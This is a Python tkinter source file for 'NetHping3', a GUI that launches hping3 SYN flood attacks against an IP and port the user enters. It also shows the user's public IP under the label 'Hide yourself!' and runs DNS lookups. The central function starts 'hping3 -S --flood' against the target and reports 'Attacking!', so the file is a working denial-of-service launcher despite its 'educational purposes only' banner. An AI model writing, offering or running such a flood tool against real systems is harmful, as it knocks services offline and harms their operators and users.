###############################################
# This tool is made only for educations purposes only! Use at your own risk.
###############################################

import tkinter as tk
import subprocess
import time

###############################################
subprocess.run(['clear'])
###############################################

window = tk.Tk()
window.title("NetHping3")
window.geometry("740x660")
window.config(bg="#252525")

################################################
# TEXTs
# App Name

text1 = tk.Label(
    window, 
    text="NetHping3  -  GUI App", 
    fg="lightblue", 
    bg="#252525", 
    font=("Arial", 25, "bold")
    )
text1.place(x=175, y=5)

#
# Versions

text2 = tk.Label(
    window, 
    text="""Python 3.13.5 
    Hping 3.0.0-alpha-2 
    Curl 8.21.0 
    Nslookup 9.20.26-1""", 
    fg="white", 
    bg="#252525", 
    font=("Bold", 10)
    )
text2.place(x=3, y=3)

#
# Hping3 Automatization

text3 = tk.Label(
    window, 
    text="Internet Protocol / Domain:", 
    fg="white", 
    bg="#252525", 
    font=("Bold", 12)
    )
text3.place(x=450, y=120)

text4 = tk.Label(
    window, 
    text="Port / Leave empty:", 
    fg="white", 
    bg="#252525", 
    font=("Bold", 12)
    )
text4.place(x=450, y=230)

text5 = tk.Label(
    window, 
    text="Attack:", 
    fg="white", 
    bg="#252525", 
    font=("Bold", 13)
    )
text5.place(x=450, y=330)

#
# Public IP Texts

text6 = tk.Label(
    window,
    text="Hide yourself!",
    fg="red", 
    bg="#252525", 
    font=("Bold", 13)
    )
text6.place(x=110, y=150)

text7 = tk.Label(
    window,
    text="Your Public IP:",
    fg="white", 
    bg="#252525", 
    font=("Bold", 13)
    )
text7.place(x=50, y=190)

text8 = tk.Label(
    window,
    text="Unknown",
    fg="lightblue", 
    bg="#252525", 
    font=("Bold", 13)
    )
text8.place(x=175, y=190)

#
# For Errors/red color at Hping3 Automatization

text9 = tk.Label(
    window,
    fg="red", 
    bg="#252525", 
    font=("Bold", 15)
    )
text9.place(x=450, y=412)

text10 = tk.Label(
    window,
    fg="red", 
    bg="#252525", 
    font=("Bold", 15)
    )
text10.place(x=445, y=500)

#
# DNS Texts

text11 = tk.Label(
    window,
    text="DNS Check:",
    fg="white", 
    bg="#252525", 
    font=("Bold", 13)
    )
text11.place(x=50, y=330)

text12 = tk.Label(
    window,
    text="Unknown",
    fg="lightblue", 
    bg="#252525", 
    font=("Bold", 12)
    )
text12.place(x=45, y=470)

#
# Middle Line for Look

text13 = tk.Label(
    window,
    text="""
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |
    |""",
    fg="black", 
    bg="#252525", 
    font=("Bold", 12)
    )
text13.place(x=345, y=30)

################################################
# Commands
# inputs
#
# Hping3 inputs & commands

ip_input = tk.Entry(window, fg="black", bg="white", font=("bold", 18))
ip_input.place(x=420, y=150)

port_input = tk.Entry(window, fg="black", bg="white", font=("bold", 18))
port_input.place(x=420, y=260)

#

def target():
    ip = ip_input.get()
    port = port_input.get()

    if not ip:
        text9.config(text="Failed!")
        return
    
    try:
        subprocess.Popen(['hping3', '-S', '--flood', '-p', port, ip])
        text9.config(text="Attacking!")
    except:
        text9.config(text="Failed!")

#
# The Stop button to kill the Hping3 proccess!

def stopKill():
    try:
        subprocess.run(['pkill', '-f', 'hping3'])
        text10.config(text="Stopped!")
    except:
        text10.config(text="Failed to Stop!")

enter = tk.Button(
    window, 
    text="                Enter                 ", 
    command=target, 
    fg="black", 
    bg="white",
    font=("bold", 18))
enter.place(x=420, y=360)

enter = tk.Button(
    window, 
    text="                Stop                  ", 
    command=stopKill, 
    fg="black", 
    bg="white",
    font=("bold", 18))
enter.place(x=422, y=450)

#################################################
# Getting public ip

def ip():
    result = subprocess.run(['curl', 'myip.wtf'], capture_output=True, text=True)

    ip = result.stdout.strip()

    if ip:
        text8.config(text=f"{ip}")
        
    else:
        text8.config(text="Connection Failed!")

enterip = tk.Button(
    window,
    text="        Enter to show                ",
    command=ip,
    fg="black",
    bg="white",
    font=("bold", 15))
enterip.place(x=30, y=230)

#################################################
# For Checking DNS

dns_input = tk.Entry(window, fg="black", bg="white", font=("bold", 18))
dns_input.place(x=30, y=360)

def dns():
    dns0 = dns_input.get()
    result = subprocess.run(['nslookup', dns0], capture_output=True, text=True)

    dns1 = result.stdout.strip()

    if dns1:
        text12.config(text=f"{dns1}")
        
    else:
        text12.config(text="Connection Failed!")

enterdns = tk.Button(
    window,
    text="        Enter to show                ",
    command=dns,
    fg="black",
    bg="white",
    font=("bold", 15))
enterdns.place(x=35, y=420)

#################################################
# Running the app

window.mainloop()

#################################################
